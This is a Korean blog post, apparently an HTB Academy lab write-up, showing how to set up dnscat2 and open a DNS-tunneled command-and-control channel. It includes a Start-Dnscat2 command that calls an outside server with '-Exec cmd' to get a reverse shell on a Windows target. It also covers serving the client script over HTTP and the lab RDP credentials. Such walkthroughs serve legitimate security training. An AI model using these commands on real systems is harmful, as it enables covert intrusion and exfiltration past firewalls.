---
title: "DNS Tunneling with Dnscat2"
date: 2025-10-01
layout: single
author_profile: true
toc: true
toc_label: "DNS Tunneling"
toc_icon: "globe"
toc_sticky: true
tags: [networking, dns, tunneling, exfiltration, dnscat2]
header:
  teaser: /assets/network-screenshots/dnscat2/dnscat2.png
---

**Dnscat2**는 DNS 프로토콜을 이용해 두 호스트 간에 암호화된 터널(커맨드 & 제어 채널)을 구성하는 도구이다.  
데이터는 주로 DNS의 TXT 레코드(또는 기타 레코드) 내부에 인코딩되어 전송되며, 일반적인 방화벽/프록시 규칙을 우회하거나 탐지를 어렵게 하는 데 사용될 수 있다.  
이 기법은 HTTPS 연결을 차단하거나 트래픽을 스니핑하는 방화벽을 회피하면서 데이터 유출에 악용될 수 있다.

---

# Dnscat2 설정 및 사용 실습

## 설치

먼저 `dnscat2` 저장소를 클론한다.

```bash
$ git clone https://github.com/iagox86/dnscat2.git

Cloning into 'dnscat2'...
remote: Enumerating objects: 6621, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 6621 (delta 2), reused 0 (delta 0), pack-reused 6611 (from 2)
Receiving objects: 100% (6621/6621), 3.84 MiB | 28.90 MiB/s, done.
Resolving deltas: 100% (4566/4566), done.
```

그후 몇 가지 설정을 한다.

```bash
$ cd dnscat2/server/
$ sudo gem install bundler
$ sudo bundle install
```

설치가 완료되면 클론한 디렉토리에서 `dnscat2` 서버를 시작할 수 있다.

## 서버 시작

클론한 리포지토리의 서버 디렉토리로 이동한 뒤 서버를 실행한다.

![Netsh Port Forward Diagram](/assets/network-screenshots/dnscat2/server-start.png)

서버가 시작되면 콘솔에 `secret(예: c00d7a...)` 이 표시된다. 이 키는 클라이언트와의 암호화/인증에 사용되므로 클라이언트에 동일한 `--secret` 값을 제공해야 안전하게 통신할 수 있다.

## 공격 호스트에 dnscat2-powershell 복제

공격 호스트에 Windows용 클라이언트로 사용할 `dnscat2-powershell`을 클론한다.

```bash
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git

Cloning into 'dnscat2-powershell'...
remote: Enumerating objects: 194, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 194 (delta 0), reused 2 (delta 0), pack-reused 188 (from 1)
Receiving objects: 100% (194/194), 1.27 MiB | 22.74 MiB/s, done.
Resolving deltas: 100% (59/59), done.
```

이후 문제에서 제공한 아이디/비밀번호(`htb-student/HTB_@cademy_stdnt!`) 를 이용하여 RDP 세션에 접속한다.

```bash
$ xfreerdp3 /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
```

이후, `python3` 웹 서버를 열어 공격 호스트에 `dnscat2.ps1` 파일을 옮겨준다.

```bash
$ python3 -m http.server 9999
```

공격 호스트에 `wget` 명령어를 이용하여 다운로드 한다.

![Netsh Port Forward Diagram](/assets/network-screenshots/dnscat2/wget.png)


## 세션 설정

`Import-Module` 명령어를 이용하여 `dnscat2.ps1` 스크립트를 불러온다.

```powershell
C:\Users\htb-student> Import-Module .\dnscat2.ps1
```

이후, 로컬에서 실행 중인 **dnscat2 서버의 주소와 도메인, Secret 키를 사용**해 클라이언트를 시작한다.

```powershell
C:\Users\htb-student> Start-Dnscat2 -DNSserver 10.10.14.89 -Domain inlanefreight.local -PreSharedSecret c00d7a451bf93fa63626874a78d0f5da -Exec cmd
```

설정 후 나의 로컬 쪽 dnscat2 터미널로 돌아가면 다음과 같이 **세션 연결** 로그를 확인할 수 있다.

![Netsh Port Forward Diagram](/assets/network-screenshots/dnscat2/session-connect.png)

이후 `dnscat` 콘솔에서 리버스 연결로 생성된 세션 창을 선택(`window -i 1`)하면 `C:\Users\htb-student` 사용자의 쉘을 획득할 수 있다.

![Netsh Port Forward Diagram](/assets/network-screenshots/dnscat2/whoami.png)

`whoami` 명령어를 사용하여 해당 세션이 **officemanager 도메인 OR 호스트 소속의 htb-student 계정**임을 확인할 수 있다.

## Flag 획득

문제에서 제공한 `C:\Users\htb-student\Documents\flag.txt` 경로의 파일을 읽어 플래그를 획득하였다.

![Netsh Port Forward Diagram](/assets/network-screenshots/dnscat2/flag.png)

이로써 **Dnscat2** 실습을 마쳤다.



